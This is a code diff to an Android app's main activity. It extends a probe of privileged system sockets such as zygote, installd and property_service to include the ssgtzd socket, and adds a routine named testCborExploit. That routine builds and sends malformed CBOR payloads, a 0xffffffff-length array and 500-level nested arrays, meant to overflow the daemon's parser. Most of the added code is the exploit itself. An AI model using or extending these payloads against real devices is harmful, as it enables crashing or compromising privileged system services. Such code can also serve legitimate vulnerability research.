@@ -217,7 +217,8 @@ public class MainActivity extends AppCompatActivity {
         String[] targetSockets = {
             "/dev/socket/dnsproxyd", "/dev/socket/fwmarkd", "/dev/socket/logd",
             "/dev/socket/zygote", "/dev/socket/adbd", "/dev/socket/installd",
-            "/dev/socket/netd", "/dev/socket/lmkd", "/dev/socket/property_service"
+            "/dev/socket/netd", "/dev/socket/lmkd", "/dev/socket/property_service",
+            "/dev/socket/ssgtzd"
         };
         for (String path : targetSockets) {
             if (stopRequested.get()) break;
@@ -347,13 +348,17 @@ public class MainActivity extends AppCompatActivity {
             String fdInfo = nativeTestFd(pfd.getFd());
             appendLog("[FD] " + fdInfo);
             String base = new File(path).getName();
-            switch (base) {
-                case "dnsproxyd": testDnsProxy(fd); break;
-                case "fwmarkd": testFwmarkd(fd); break;
-                case "logd": testLogd(fd); break;
-                case "property_service": testPropertyService(fd); break;
-                case "zygote": testZygote(fd); break;
-                default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n"});
+            if (base.equals("ssgtzd")) {
+                testCborExploit(fd);
+            } else {
+                switch (base) {
+                    case "dnsproxyd": testDnsProxy(fd); break;
+                    case "fwmarkd": testFwmarkd(fd); break;
+                    case "logd": testLogd(fd); break;
+                    case "property_service": testPropertyService(fd); break;
+                    case "zygote": testZygote(fd); break;
+                    default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n"});
+                }
             }
             pfd.close();
         } catch (Exception e) {
@@ -370,6 +375,45 @@ public class MainActivity extends AppCompatActivity {
             appendLog("[!] RemoteException: " + e.getMessage());
             return null;
         }
+    }
+
+    private void testCborExploit(FileDescriptor fd) {
+        appendLog("[CBOR] Sending CBOR overflow payloads...");
+        try {
+            byte[] payload1 = buildCborLengthOverflow();
+            byte[] resp1 = sendBinary(fd, payload1, 512, 2000);
+            appendLog("[CBOR] Length overflow response: " + (resp1 != null ? "received " + resp1.length + " bytes" : "none"));
+
+            byte[] payload2 = buildCborNestedArray(500);
+            byte[] resp2 = sendBinary(fd, payload2, 512, 2000);
+            appendLog("[CBOR] Nested array response: " + (resp2 != null ? "received " + resp2.length + " bytes" : "none"));
+        } catch (Exception e) {
+            appendLog("[CBOR] Exception: " + e.getMessage());
+        }
+    }
+
+    private byte[] buildCborLengthOverflow() {
+        ByteBuffer buf = ByteBuffer.allocate(1 + 4 + 1 + 1);
+        buf.order(ByteOrder.BIG_ENDIAN);
+        buf.put((byte)0x9a);
+        buf.putInt(0xffffffff);
+        buf.put((byte)0xf5);
+        buf.put((byte)0xff);
+        byte[] data = new byte[buf.position()];
+        buf.rewind();
+        buf.get(data);
+        return data;
+    }
+
+    private byte[] buildCborNestedArray(int depth) {
+        int len = depth * 2 + 1;
+        byte[] arr = new byte[len];
+        for (int i = 0; i < depth; i++) {
+            arr[i] = (byte)0x9f;
+            arr[len - 1 - i] = (byte)0xff;
+        }
+        arr[depth] = (byte)0xf5;
+        return arr;
     }
 
     private void testDnsProxy(FileDescriptor fd) {
